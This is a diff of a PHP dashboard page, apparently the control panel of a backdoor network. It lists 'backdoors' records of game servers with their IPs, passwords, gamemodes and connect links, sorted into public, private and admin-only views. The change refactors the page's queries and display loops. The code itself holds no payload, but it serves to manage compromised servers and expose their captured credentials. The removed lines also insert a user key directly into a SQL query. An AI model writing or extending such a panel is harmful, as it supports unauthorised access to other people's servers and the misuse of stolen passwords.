@@ -1,142 +1,88 @@
-<?php
-require_once('config.php');
+<?php 
 
-$all = $link->query("SELECT * FROM backdoors");
-$public = $link->query("SELECT * FROM backdoors WHERE userkey = 'NONE'");
-$private = $link->query("SELECT * FROM backdoors WHERE userkey = '$userkey'");
+require_once($_SERVER['DOCUMENT_ROOT']."/panel/core/config.php");
 
-// create a top bar for the middle frame
-// have a button to create bd link
-// have public & private backdoor view
-// display the information in rows
+$all = $Log::Server("all");
+$public = $Log::Server("public");
+$private = $Log::Server("private");
+
+$Servers = array($public, $private);
+
+if($Local::IsAdmin()) {
+    $Servers = array($public, $private, $all);
+    $All = "<button onclick='show(2)' class='button material-ripple hover'>All Servers</button>";
+}
+
+$i = 0; // this will be used for displaying the server tab
 
 ?>
 
 <html>
     <head>
         <title>Worst</title>
-        <link rel='stylesheet' href='css/dashboard/style.css'>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
         <script src="js/jquery.min.js"></script>
-        <script src="js/servers.js"></script>
-        <?php 
-            if($local['usergroup'] == "admin") { 
-                echo("<style>.bar { width: 32%; } </style>");
-            }
-        ?>
+        <link rel='stylesheet' href='css/dashboard/style.css'>
+        <link rel='stylesheet' href='css/ripple.css'>
+        <script src="js/ripple.js"></script>
+        <style type="text/css">
+            .S1, .S2 { display:none; }
+        </style>
     </head>
     <body>
         <?php include_once('inc/navbar.php'); ?>
-        
-        <div class="servers-card">
-            <div class="top-bar">
-                <button class="btn bar material-ripple" id="public">Public Servers</button>
-                <button class="btn bar material-ripple" id="private" style="opacity:0.55;">Private Servers</button>
+        <div class="page-content">
+            <div class="card">
+                <div class="button-container">
+                    <button onclick="show(0)" class="button material-ripple hover">Public Servers</button>
+                    <button onclick="show(1)" class="button material-ripple hover">Private Servers</button>
+                    <?php echo($All); ?>
+                </div>
                 <?php
-                    if(in_array($local['usergroup'], $staff)) { 
-                        echo('<button class="btn bar material-ripple" id="all" style="opacity:0.55;">All Servers</button>');
-                    }
-                ?>
-            </div><br><br><br><br>
-            <div class="private">
-                <?php 
-                    if($private->num_rows > 0) {
-                        while($row = $private->fetch_assoc()) {
+                    // for each server then for each row
+                    foreach($Servers as $row => $value) {
 
-                            $server = $row['server'];
-                            $serverip = $row['serverip'];
-                            $gamemode = $row['gamemode'];
-                            $password = $row['password'];
+                        // 0/public 1/private 2/all servers
+                        echo("<div class='flexbox S$i'>"); // setting the class as i for hiding
+
+                        foreach($value as $row) {
+                            $pass = $row['password'];
+                            $mode = $row['gamemode'];
+                            $name = $row['server'];
                             $date = $row['date'];
                             $map = $row['map'];
                             $net = $row['net'];
+                            $ip = $row['ip'];
 
-                            // steam://connect/$serverip
-
-                            echo("<div class='server-select'>
-                                <table class='server-items'><br>
-                                    <tr>
-                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
-                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
-                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
-                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
-                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
-                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
-                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
-                                    </tr>
+                            // echo("$name\n");
+                            echo("<div class='server-box'>
+                                <a href='steam://connect/$ip'><img class='server-pfp circle' src='img/steam.png'></a>
+                                <table class='server-items'>
+                                    <td class='server-text'>Server: $name</td>
+                                    <td class='server-text'>Server IP: $ip</td>
+                                    <td class='server-text'>Password: $pass</td>
+                                    <td class='server-text'>Gamemode: $mode</td>
+                                    <td class='server-text'>Net: $net</td>
+                                    <td class='server-text'>Map: $map</td>
+                                    <td class='server-text'>Date: $date</td>
                                 </table>
-                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
                             </div>");
                         }
+
+                        echo("</div>");
+
+                        $i++;
                     }
                 ?>
-            </div>
-            <div class="public">
-                <?php 
-                    if($public->num_rows > 0) {
-                        while($row = $public->fetch_assoc()) {
-
-                            $server = $row['server'];
-                            $serverip = $row['serverip'];
-                            $gamemode = $row['gamemode'];
-                            $password = $row['password'];
-                            $date = $row['date'];
-                            $map = $row['map'];
-                            $net = $row['net'];
-
-                            // steam://connect/$serverip
-
-                            echo("<div class='server-select'>
-                                <table class='server-items'><br>
-                                    <tr>
-                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
-                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
-                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
-                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
-                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
-                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
-                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
-                                    </tr>
-                                </table>
-                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
-                            </div>");
-                        }
-                    }
-                ?>
-            </div>
-            <?php 
-                if(in_array($local['usergroup'], $staff)) { 
-                    echo("<div class='all'>");
-                    if($all->num_rows > 0) {
-                        while($row = $all->fetch_assoc()) {
-
-                            $server = $row['server'];
-                            $serverip = $row['serverip'];
-                            $gamemode = $row['gamemode'];
-                            $password = $row['password'];
-                            $date = $row['date'];
-                            $map = $row['map'];
-                            $net = $row['net'];
-
-                            // steam://connect/$serverip
-
-                            echo("<div class='server-select'>
-                                <table class='server-items'><br>
-                                    <tr>
-                                        <td class='server-text'><strong>Server: </strong><span>$server</span></td>
-                                        <td class='server-text'><strong>Server-Ip: </strong><span>$serverip</span></td>
-                                        <td class='server-text'><strong>Gamemode: </strong><span>$gamemode</span></td>
-                                        <td class='server-text'><strong>Password: </strong><span>$password</span></td>
-                                        <td class='server-text'><strong>Net: </strong><span>$net</span></td>
-                                        <td class='server-text'><strong>Map: </strong><span>$map</span></td>
-                                        <td class='server-text'><strong>Date: </strong><span>$date</span></td>
-                                    </tr>
-                                </table>
-                                <a href='steam://connect/$serverip'><img class='rounded-circle log-pfp' src='img/steam.png'></a>
-                            </div>");
-                        }
-                    }
-                }
-            ?>
+            <br></div>
         </div>
     </body>
 </html>
+<script>
+    function show(tab) {
+        if(tab == 0) { $('.S0').fadeIn(250).css("display", "flex"); $('.S1').fadeOut(0); $('.S2').fadeOut(0); }
+        if(tab == 1) { $('.S0').fadeOut(0); $('.S1').fadeIn(250).css("display", "flex"); $('.S2').fadeOut(0); }
+        if(tab == 2) { $('.S0').fadeOut(0); $('.S1').fadeOut(0); $('.S2').fadeIn(250).css("display", "flex"); }
+    }
+</script>
